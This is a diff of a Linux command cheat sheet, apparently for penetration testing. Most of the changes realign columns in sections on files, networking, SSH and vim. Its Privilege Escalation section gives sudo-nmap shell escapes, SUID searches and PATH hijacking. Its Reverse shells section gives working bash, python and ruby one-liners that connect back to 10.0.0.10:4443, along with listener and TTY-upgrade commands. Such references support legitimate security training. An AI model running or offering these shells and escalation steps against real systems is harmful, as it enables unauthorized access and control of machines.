@@ -3,21 +3,21 @@ Linux
  
 # Compile
 
-gcc -o test test.c                 Compile test
-chmod 755 test                     Make the file executable
-./test                             Run the file
+gcc -o test test.c                   Compile test
+chmod 755 test                       Make the file executable
+./test                               Run the file
 ------------------------------------------------------------------------------------------------------
 
 # Compression
 
-tar xvfj test.tar.bz2              Extract
+tar xvfj test.tar.bz2                Extract
 tar zxvf test.tar.gz
 tar zxvf test.tar
 gzip -d test.gz
 unzip test.zip
 zcat rockyou.txt.gz > rockyou.txt
  
-tar -zcvf test.tar test            Compress
+tar -zcvf test.tar test              Compress
 gzip test
 zip -9 test.zip test
 zip -r test.zip test/
@@ -42,105 +42,105 @@ read    (r)	 4
 write   (w)	 2
 execute (e)	 1
  
-chmod 755 test.sh                  Make a file executable
+chmod 755 test.sh                    Make a file executable
 ------------------------------------------------------------------------------------------------------
 
 # File System
 
-/etc/passwd                        User accounts
-/etc/shadow                        Encrypted passwords
+/etc/passwd                          User accounts
+/etc/shadow                          Encrypted passwords
 ------------------------------------------------------------------------------------------------------
  
 # Files
  
-ls                                 List files in a directory
-ls -l                              Long form listing
-ls -la                             Long form listing with hidden files
+ls                                   List files in a directory
+ls -l                                Long form listing
+ls -la                               Long form listing with hidden files
 
-cd ~                               Change to the home directory
-cd test                            Change to the test directory
-pwd                                Current directory
+cd ~                                 Change to the home directory
+cd test                              Change to the test directory
+pwd                                  Current directory
 
-cp tmp tmp2                        Copy a file from one location to another
-cp -r dir dir2                     Copy a directory from one location to another
-mv tmp tmp2                        Rename or move tmp to tmp2
-rm tmp                             Delete the file tmp
-rm -rf test                        Force delete the directory test
+cp tmp tmp2                          Copy a file from one location to another
+cp -r dir dir2                       Copy a directory from one location to another
+mv tmp tmp2                          Rename or move tmp to tmp2
+rm tmp                               Delete the file tmp
+rm -rf test                          Force delete the directory test
 
-ln -s /path/to/file /path/to/link  Create a symbolic link
+ln -s /path/to/file /path/to/link    Create a symbolic link
 
-mkdir tmp                          Create a directory called tmp
-touch tmp                          Create a file called tmp
+mkdir tmp                            Create a directory called tmp
+touch tmp                            Create a file called tmp
 
-cat tmp                            Contents of tmp
-ifconfig > tmp                     Pipe the output of a command to a file
-cat tmp >> tmp2                    Append the contents of a file (tmp) to another file (tmp2)
+cat tmp                              Contents of tmp
+ifconfig > tmp                       Pipe the output of a command to a file
+cat tmp >> tmp2                      Append the contents of a file (tmp) to another file (tmp2)
 
-head tmp                           First 10 lines of tmp
-head -20 tmp                       First 20 lines of tmp
-more tmp                           Contents of tmp, one page at a time 
-                                   Space bar for the next page or q to quit
+head tmp                             First 10 lines of tmp
+head -20 tmp                         First 20 lines of tmp
+more tmp                             Contents of tmp, one page at a time
+                                     Space bar for the next page or q to quit
 
-tail tmp                           Last 10 lines of tmp
-tail -20 tmp                       Last 20 lines of tmp
-tail -f tmp                        File contents as it grows
+tail tmp                             Last 10 lines of tmp
+tail -20 tmp                         Last 20 lines of tmp
+tail -f tmp                          File contents as it grows
 ------------------------------------------------------------------------------------------------------
 
 # File Integrity
 
-md5sum test.iso                    MD5 hash
-sha1sum test.iso                   SHA1 hash
-sha256sum test.iso                 SHA256 hash
+md5sum test.iso                      MD5 hash
+sha1sum test.iso                     SHA1 hash
+sha256sum test.iso                   SHA256 hash
 ------------------------------------------------------------------------------------------------------
 
 # Finding Files
 
-updatedb                           Update the database of file names on the system
-locate file                        Reads the database and shows the location of a file
-which app                          Path where the app is executed from
+updatedb                             Update the database of file names on the system
+locate file                          Reads the database and shows the location of a file
+which app                            Path where the app is executed from
 
-find / -name pass*                 Find all the files that start with pass
+find / -name pass*                   Find all the files that start with pass
 
-find / -user <user> 2>/dev/null    All files owned by a particular user
-find / -group <group> 2>/dev/null  All files owned by a particular group
+find / -user <user> 2>/dev/null      All files owned by a particular user
+find / -group <group> 2>/dev/null    All files owned by a particular group
 ------------------------------------------------------------------------------------------------------
 
 # Installation
  
-./configure                        Install from source
+./configure                          Install from source
 make
 make install
 
-dpkg -i app.deb                    Install Debian package
-rpm -Uvh app.rpm                   Install RPM package
+dpkg -i app.deb                      Install Debian package
+rpm -Uvh app.rpm                     Install RPM package
 
-dpkg-query -l                      Installed packages
+dpkg-query -l                        Installed packages
 
-pip install -r requirements.txt    Install required packages listed in a file
+pip install -r requirements.txt      Install required packages listed in a file
 ------------------------------------------------------------------------------------------------------
 
 # Networking
 
-dhclient                           Request an IP address from the DHCP server
-netstat -antpu                     Listening ports, services, and PIDs
-route                              Gateway
-/etc/hostname                      Hostname
-/etc/network/interfaces            Network interfaces
-/var/lib/dhcp/dhclient.leases      DHCP
+dhclient                             Request an IP address from the DHCP server
+netstat -antpu                       Listening ports, services, and PIDs
+route                                Gateway
+/etc/hostname                        Hostname
+/etc/network/interfaces              Network interfaces
+/var/lib/dhcp/dhclient.leases        DHCP
 
-/etc/resolv.conf                   DNS
+/etc/resolv.conf                     DNS
 domain localdomain 
 search localdomain 
 nameserver 8.8.8.8
 
-ifconfig                           IP address
-ifconfig eth0 down                 Stop interface
-ifconfig eth0 up                   Start interface
-ifconfig eth0 <IP>                 Set IP address
-ifconfig eth0 <IP> netmask <IP>    Set IP and netmask
-route add default gw <IP>          Set gateway
+ifconfig                             IP address
+ifconfig eth0 down                   Stop interface
+ifconfig eth0 up                     Start interface
+ifconfig eth0 <IP>                   Set IP address
+ifconfig eth0 <IP> netmask <IP>      Set IP and netmask
+route add default gw <IP>            Set gateway
 
-/etc/network/interfaces            Set a static IP address
+/etc/network/interfaces              Set a static IP address
 iface eth0 inet static
 address 192.168.2.10
 netmask 255.255.255.0
@@ -148,42 +148,45 @@ network 192.168.2.0
 broadcast 192.168.2.255
 gateway 192.168.2.1
 
-/etc/init.d/networking restart     Restart networking
+/etc/init.d/networking restart       Restart networking
 ------------------------------------------------------------------------------------------------------
 
 # Privilege Escalation
 
-ls /home/                          Look for other users
-cat /etc/sudoers                   Allocate system rights to system users
-sudo -l                            Short version
-sudo -u <user> script.sh           Execute a script as another user
-id                                 User and group info on the current user
-echo "os.execute('/bin/sh')">test.nse
-sudo nmap --script=test.nse
+- Automated scripts
+enum4linux -a <target IP>
+LinEnum                                   https://github.com/rebootuser/LinEnum
+lynis audit system remote <target IP>
 
-- Check for binaries with Sticky bit, SUID, and GUID.
-find / -perm -1000 -type d 2>/dev/null    # Sticky bit - only the owner of a directory or a file can delete or rename.
-find / -perm -u=s -type f 2>/dev/null     # SUID (chmod 4000) - run as the owner, not the user who started it.
-find / -perm -g=s -type f 2>/dev/null     # GUID (chmod 2000) - run as the group, not the user who started it.
+- sudoers
+cat /etc/sudoers                          Contains the rules that users must follow when using the sudo command
+                                          Example: the user lee has root privs when running nmap
+echo "os.execute('/bin/sh')" > test.nse
+sudo -u lee nmap --script=test.nse
 
-- Abuse the PATH variable
+- Check for binaries with the Sticky bit, SUID, and GUID.
+find / -perm -1000 -type d 2>/dev/null    Sticky bit - only the owner of a directory or a file can delete or rename.
+find / -perm -u=s -type f 2>/dev/null     SUID (chmod 4000) - run as the owner, not the user who started it.
+find / -perm -g=s -type f 2>/dev/null     GUID (chmod 2000) - run as the group, not the user who started it.
+
+- Abuse the PATH variable.
 echo '/bin/sh' > whoami
 chmod 777 whoami
 export PATH=/tmp:$PATH
 /usr/bin/bin_with_suid
-id                                 User and group info on the current user
+id                                        User and group info on the current user
 
 - Check for world-writable files and folders.
-find / -perm -o+w -type f 2>/dev/null     # world-writeable files
-find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print     # world-writeable files
+find / -perm -o+w -type f 2>/dev/null     World-writeable files
+find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print    World-writeable files
 
-find / -writable -type d 2>/dev/null      # world-writeable folders
-find / -perm -222 -type d 2>/dev/null     # world-writeable folders
-find / -perm -o+w -type d 2>/dev/null     # world-writeable folders
+find / -writable -type d 2>/dev/null      World-writeable folders
+find / -perm -222 -type d 2>/dev/null     World-writeable folders
+find / -perm -o+w -type d 2>/dev/null     World-writeable folders
 
 - Check for world-execuable files and folders.
-find / -perm -o+x -type f 2>/dev/null     # world-executable files
-find / -perm -o+x -type d 2>/dev/null     # world-executable folders
+find / -perm -o+x -type f 2>/dev/null     World-executable files
+find / -perm -o+x -type d 2>/dev/null     World-executable folders
 
 - Check for world-writeable & world-executable folders
 find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null
@@ -192,8 +195,8 @@ find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null
 find /dir -xdev \( -nouser -o -nogroup \) -print
 
 - Cron jobs
-crontab -l                         Check for entries
-ls -l /etc/cron*                   Scheduled cron jobs
+crontab -l                           Check for entries
+ls -l /etc/cron*                     Scheduled cron jobs
 
 What files are owned by a particular user, but are not present in their home directory?
 What are the files present in the /home/user folder? Are there any hidden files and folders?
@@ -202,12 +205,12 @@ What groups does the user belong to?
 
 # Processes
 
-ps faux                            All running processes
-ps -ef | grep root                 Processes running as root
-ps -ef | grep -v root              Processes running under another account besides root
-top                                Running processes, CPU, and memory
-kill -9 <PID>                      Kill process ID
-killall <service>                  Kill all processes named service
+ps faux                              All running processes
+ps -ef | grep root                   Processes running as root
+ps -ef | grep -v root                Processes running under another account besides root
+top                                  Running processes, CPU, and memory
+kill -9 <PID>                        Kill process ID
+killall <service>                    Kill all processes named service
 ------------------------------------------------------------------------------------------------------
 
 # Proxy
@@ -240,8 +243,8 @@ rdesktop -u username -p password -g 85% -r disk:share=/root/ 10.0.0.10
 
 # Reverse shells
 
-- Set local listener
-nc -lvp 4443			          Setup a listen on the attack box.
+- Setup a local listener
+nc -lvp 4443			     Setup a listen on the attack box
 
 - Bash shell
 bash -i >& /dev/tcp/10.0.0.10/4443 0>&1
@@ -273,62 +276,44 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.10",4443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 
 - xterm
-xterm -display 10.0.0.10:1		target - It will connect back to you on TCP port 6001.
-Xnest :1				          attacker - catch the incoming xterm, start an X-Server.
-xhost +targetIP				attacker - Authorise the target to connect to you.
+xterm -display 10.0.0.10:1           target - it will connect back to you on TCP port 6001.
+Xnest :1                             attacker - catch the incoming xterm, start an X-Server.
+xhost +targetIP                      attacker - authorise the target to connect to you.
+
+- Upgrade to a full TTY session.
+Python         python -c 'import pty; pty.spawn("/bin/sh")'
+sh             echo os.system('/bin/bash')
+sh             /bin/sh -i
+Perl           perl —e 'exec "/bin/sh";'
+Perl           exec "/bin/sh";
+Ruby           exec "/bin/sh"
+Lua            os.execute('/bin/sh')
+Within IRB     exec "/bin/sh"
+Within vi      :!bash
+Within vi      :set shell=/bin/bash:shell
+Within nmap    !sh
 ------------------------------------------------------------------------------------------------------
 
 # Screen
 
-screen -S test                     Start a new screen session named test
-ctrl + a d                         Detach from the session
-screen -ls                         Sessions
-screen -dr                         Attach to the current session
-screen -r <PID or name>            Attach to a specific session
-exit                               Exit the session
+screen -S test                       Start a new screen session named test
+ctrl + a d                           Detach from the session
+screen -ls                           Sessions
+screen -dr                           Attach to the current session
+screen -r <PID or name>              Attach to a specific session
+exit                                 Exit the session
 ------------------------------------------------------------------------------------------------------
 
 # Searching
 
-grep                               Search for a pattern a file
-grep -r                            Search recursively for a pattern in a directory
-zgrep                              Search for a pattern in a zip file
-------------------------------------------------------------------------------------------------------
-
-# Spawning a TTY Shell
-
-- IRB
-exec "/bin/sh"
-
-- Lua
-lua: os.execute('/bin/sh')
-
-- Perl
-perl -e 'exec "/bin/sh";'
-perl: exec "/bin/sh";
-
-- Python
-python -c 'import pty;pty.spawn("/bin/bash")'
-
-- Ruby
-ruby: exec "/bin/sh"
-
-- sh
-/bin/sh -i
-echo os.system('/bin/bash')
-
-- vi
-:!bash
-:set shell=/bin/bash:shell
-
-If you execute
-vi ;/bin/bash
-Once we exit vi, we would get shell.
+grep                                 Search for a pattern a file
+grep -r                              Search recursively for a pattern in a directory
+zgrep                                Search for a pattern in a zip file
 ------------------------------------------------------------------------------------------------------
 
 # SSH
 
-ssh-keygen                         Generate new public/private key pair
+ssh-keygen                           Generate new public/private key pair
 
 - Permissions
 -rw-------  authorized_keys
@@ -338,10 +323,10 @@ ssh-keygen                         Generate new public/private key pair
 -rw-------  identity_file
 -rw-r--r--  known_hosts
 
-ssh root@targetIP                  Connect as root on a standard port
-ssh targetIP                       Connect with no user name on a standard port
-ssh root@targetIP -p 2222          Connect as root on a non-standard port
-ssh root@targetIP -i key           Connect as root and authenticate using an identity file
+ssh root@targetIP                    Connect as root on a standard port
+ssh targetIP                         Connect with no user name on a standard port
+ssh root@targetIP -p 2222            Connect as root on a non-standard port
+ssh root@targetIP -i key             Connect as root and authenticate using an identity file
 
 - Local port forward
 ssh <gateway> -L <local port to listen>:<remote host>:<remote port>
@@ -350,26 +335,26 @@ ssh user@targetIP -L 5900:localhost:5900
 - Remote port forwarding
 ssh <gateway> -R <remote port to bind>:<local host>:<local port>
 ssh user@targetIP -R 2222:localhost:22 -f -N
-                                   -f  Force to background
-                                   -N  Do not execute a remote command
+                                     -f   Force to background
+                                     -N   Do not execute a remote command
 
 - Dynamic port forward
 ssh -D <local proxy port> -p <remote port> <target>
-ssh user@targetIP -C -D 1080       -C  Enable compression, good for web browsing
-                                   -D  Create a SOCKS tunnel on the default port
+ssh user@targetIP -C -D 1080         -C   Enable compression, good for web browsing
+                                     -D   Create a SOCKS tunnel on the default port
 
 Firefox Preferences > Advanced > Network > Settings > Manual proxy configuration
 Remove everything for HTTP, SSL, and FTP proxies and ports
 SOCKS Host: 127.0.0.1   Port: 1080
 Select SOCKS v5 and Remote DNS
 
-/etc/ssh/ssh_config                Config file
-ForwardX11 yes                     Uncomment and change to yes
-ForwardX11Trusted yes              Uncomment
+/etc/ssh/ssh_config                  Config file
+ForwardX11 yes                       Uncomment and change to yes
+ForwardX11Trusted yes                Uncomment
 
 export DISPLAY=localhost:0.0
 exit
-ssh user@targetIP -Y               Connect and use X11 forwarding
+ssh user@targetIP -Y                 Connect and use X11 forwarding
 ------------------------------------------------------------------------------------------------------
 
 # Startup Services
@@ -382,44 +367,44 @@ update-rc.d networking defaults
 
 # System
 
-cal                                Calendar
-date                               Date and time
-df -h                              Disk usage
-du                                 Directory space usage
-env                                Environmental variables
-/etc/issue                         OS info
-fdisk -l                           Partition table
-finger <user>                      Info about a user
-free                               Memory and swap usage
-halt                               Power off
-/proc/cpuinfo                      CPU info
-/proc/meminfo                      Memory info
-reboot                             Reboot
-set                                Environmental variables
-uname -a                           Kernel info
-uptime                             Current uptime
+cal                                  Calendar
+date                                 Date and time
+df -h                                Disk usage
+du                                   Directory space usage
+env                                  Environmental variables
+/etc/issue                           OS info
+fdisk -l                             Partition table
+finger <user>                        Info about a user
+free                                 Memory and swap usage
+halt                                 Power off
+/proc/cpuinfo                        CPU info
+/proc/meminfo                        Memory info
+reboot                               Reboot
+set                                  Environmental variables
+uname -a                             Kernel info
+uptime                               Current uptime
 ------------------------------------------------------------------------------------------------------
 
 # Terminal
 
-ctrl + alt + t                     Open a Terminal
-ctrl + shift + t                   Open a new tab in Terminal
-ctrl + a                           Go to the beginning of the line
-ctrl + l                           Clear the screen
+ctrl + alt + t                       Open a Terminal
+ctrl + shift + t                     Open a new tab in Terminal
+ctrl + a                             Go to the beginning of the line
+ctrl + l                             Clear the screen
 ------------------------------------------------------------------------------------------------------
 
 # tmux
 
-tmux                               Start a new session
-ctrl + b, %                        Split the pane vertically
-ctrl + b, "                        Split the pane horizontally
-ctrl + b, arrow                    Switch between panes
-ctrl + d                           Close pane
-ctrl + b, d                        Detach from current session
-tmux attach -d                     Attach to previous session
+tmux                                 Start a new session
+ctrl + b, %                          Split the pane vertically
+ctrl + b, "                          Split the pane horizontally
+ctrl + b, arrow                      Switch between panes
+ctrl + d                             Close pane
+ctrl + b, d                          Detach from current session
+tmux attach -d                       Attach to previous session
 
-ctrl + b, [                        Use up/down arrows to scroll
-q                                  Quit scroll mode
+ctrl + b, [                          Use up/down arrows to scroll
+q                                    Quit scroll mode
 ------------------------------------------------------------------------------------------------------
 
 # Traffic Capture
@@ -436,74 +421,74 @@ tcpdump -w out.pcap -s 65535  'udp port 53'
 
 # Tunneling VNC over SSH
 
-OS X (awsv)                        ssh -L 5901:localhost:5901 -i ~/.ssh/aws.pem ec2-user@<atter IP>
+OS X (awsv)                          ssh -L 5901:localhost:5901 -i ~/.ssh/aws.pem ec2-user@<atter IP>
 
-Remote Kali                        sudo -i
-                                   vncserver -geometry 1440x850
+Remote Kali                          sudo -i
+                                     vncserver -geometry 1440x850
 
-OS X                               Applications > VNC Viewer: localhost:5901
+OS X                                 Applications > VNC Viewer: localhost:5901
 
-VNC                                Right click on the Desktop > Open Terminal Here
+VNC                                  Right click on the Desktop > Open Terminal Here
 
-Remote Kali                        vncserver -kill :1
+Remote Kali                          vncserver -kill :1
 ------------------------------------------------------------------------------------------------------
 
 # User Accounts
 
-whoami                             Who are you logged in as
-id                                 User and group ids
-w                                  Users currently logged on
-last                               Last 10 users logged on
+whoami                               Who are you logged in as
+id                                   User and group ids
+w                                    Users currently logged on
+last                                 Last 10 users logged on
 
-/etc/passwd                        User accounts
-/etc/shadow                        Encrypted passwords
+/etc/passwd                          User accounts
+/etc/shadow                          Encrypted passwords
 
-passwd                             Change root password
-passwd <user>                      Change another user's password
+passwd                               Change root password
+passwd <user>                        Change another user's password
 
-su                                 Substitute user
+su                                   Substitute user
 
-useradd                            Add new user
-userdel                            Delete user
-userdel -r                         Delete user and user's home directory
-usermod                            Modify user
+useradd                              Add new user
+userdel                              Delete user
+userdel -r                           Delete user and user's home directory
+usermod                              Modify user
 
-/etc/group                         Groups
-groupadd                           Add new group
-groupdel                           Delete group
-groupmod                           Modify group
+/etc/group                           Groups
+groupadd                             Add new group
+groupdel                             Delete group
+groupmod                             Modify group
 
-adduser <user> <group>             Add user to group
+adduser <user> <group>               Add user to group
 ------------------------------------------------------------------------------------------------------
 
 # Video resolution
  
-xrandr                             Supported resolutions
-xrandr -s <resolution>             Set resolution
+xrandr                               Supported resolutions
+xrandr -s <resolution>               Set resolution
 ------------------------------------------------------------------------------------------------------
 
 # vim
 
-vim oldfile                        Open an existing file
-vim newfile                        Create a new file
+vim oldfile                          Open an existing file
+vim newfile                          Create a new file
 
-Modes                              Command, Insert, Append, and Replace
+Modes                                Command, Insert, Append, and Replace
 
 Command mode
-dd                                 Delete entire line
-gg                                 Top of file
-G                                  End of file
-<esc> u                            Undo
-:set number                        Turn on line numbers
-:set nonumber                      Turn off line numbers
+dd                                   Delete entire line
+gg                                   Top of file
+G                                    End of file
+<esc> u                              Undo
+:set number                          Turn on line numbers
+:set nonumber                        Turn off line numbers
 
 Search
-/                                  Search string
-n                                  Next string
-N                                  Previous string
+/                                    Search string
+n                                    Next string
+N                                    Previous string
 
 Search and replace
-:%s/foo/bar/g                      Search for foo and replace with bar globally
+:%s/foo/bar/g                        Search for foo and replace with bar globally
 
 Insert mode
 Position the cursor where the new text should go.
@@ -523,19 +508,19 @@ r
 Enter the replacement character.
 <esc> to return to command mode.
 
-<esc>                              Quit
+<esc>                                Quit
 :q
 <return>
 
-<esc>                              Force quit
+<esc>                                Force quit
 :q!
 <return>
 
-<esc                               Write changes
+<esc                                 Write changes
 :w
 <return>
 
-<esc>                              Write changes and quit
+<esc>                                Write changes and quit
 :wq
 <return>
 ------------------------------------------------------------------------------------------------------
@@ -568,3 +553,4 @@ rsysinfo <target IP>
 # Samba with a writeable file share
 
 smbclient -L //<target IP>
+
